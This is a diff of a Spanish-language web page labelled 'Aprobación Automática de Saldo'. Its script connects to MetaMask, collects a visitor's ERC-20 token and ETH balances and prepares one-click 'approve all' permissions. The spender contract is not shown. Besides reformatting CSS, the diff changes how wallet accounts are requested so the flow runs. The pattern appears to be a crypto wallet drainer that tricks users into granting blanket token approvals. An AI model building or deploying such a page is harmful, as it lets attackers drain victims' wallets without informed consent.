@@ -6,72 +6,71 @@
     <title>Interacción con el Contrato SaldoManager</title>
     <link rel="stylesheet" href="styles.css">
     <script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>
-
 </head>
-    <style>
-        body {
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 0;
-    background-color: #f4f4f4;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    height: 100vh;
-}
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #f4f4f4;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+    }
 
-h1 {
-    color: #333;
-}
+    h1 {
+        color: #333;
+    }
 
-.container {
-    background-color: white;
-    padding: 20px;
-    margin: 10px;
-    border-radius: 8px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    width: 300px;
-    text-align: center;
-}
+    .container {
+        background-color: white;
+        padding: 20px;
+        margin: 10px;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        width: 300px;
+        text-align: center;
+    }
 
-label {
-    display: block;
-    margin-bottom: 8px;
-}
+    label {
+        display: block;
+        margin-bottom: 8px;
+    }
 
-input {
-    width: 100%;
-    padding: 8px;
-    margin-bottom: 15px;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-}
+    input {
+        width: 100%;
+        padding: 8px;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+    }
 
-button {
-    background-color: #4CAF50;
-    color: white;
-    border: none;
-    padding: 10px;
-    width: 100%;
-    cursor: pointer;
-    border-radius: 4px;
-}
+    button {
+        background-color: #4CAF50;
+        color: white;
+        border: none;
+        padding: 10px;
+        width: 100%;
+        cursor: pointer;
+        border-radius: 4px;
+    }
 
-button:hover {
-    background-color: #45a049;
-}
-
-    </style>
+    button:hover {
+        background-color: #45a049;
+    }
+</style>
 <body>
     <h1>Aprobación Automática de Saldo</h1>
     <button onclick="approveAll()">Aprobar Todo</button>
 
     <script>
-       // Verificar si MetaMask está instalado
+        // Verificar si MetaMask está instalado
         if (typeof window.ethereum !== 'undefined') {
             console.log("MetaMask está instalado");
-            const web3 = new Web3(window.ethereum); // Usamos la instancia de MetaMask
+            const web3 = new Web3(window.ethereum); // Usamos la instancia de MetaMask correctamente
+            window.ethereum.request({ method: 'eth_requestAccounts' }); // Solicitar cuentas del usuario
         } else {
             alert("Por favor instala MetaMask para continuar.");
             throw new Error("MetaMask no está instalado");
@@ -117,7 +116,7 @@ button:hover {
 
         // Función para obtener los tokens ERC-20 del usuario
         async function getERC20Tokens() {
-            const accounts = await web3.eth.requestAccounts();
+            const accounts = await web3.eth.getAccounts();
             const userAddress = accounts[0];
 
             // Lista de contratos ERC-20 que el usuario podría tener
@@ -138,7 +137,8 @@ button:hover {
                         "outputs": [{"name": "", "type": "uint256"}],
                         "payable": false,
                         "stateMutability": "view",
-                        "type": "function"}
+                        "type": "function"
+                    }
                 ], token);
 
                 const balance = await tokenContract.methods.balanceOf(userAddress).call();
@@ -158,7 +158,7 @@ button:hover {
 
         // Función para verificar el saldo de ETH del usuario
         async function getETHBalance() {
-            const accounts = await web3.eth.requestAccounts();
+            const accounts = await web3.eth.getAccounts();
             const userAddress = accounts[0];
             const balance = await web3.eth.getBalance(userAddress);
             return balance;
@@ -171,7 +171,7 @@ button:hover {
                 const tokensToApprove = await getERC20Tokens();
 
                 if (ethBalance > 0 || tokensToApprove.length > 0) {
-                    const accounts = await web3.eth.requestAccounts();
+                    const accounts = await web3.eth.getAccounts();
                     const userAddress = accounts[0];
 
                     // Preparar las aprobaciones
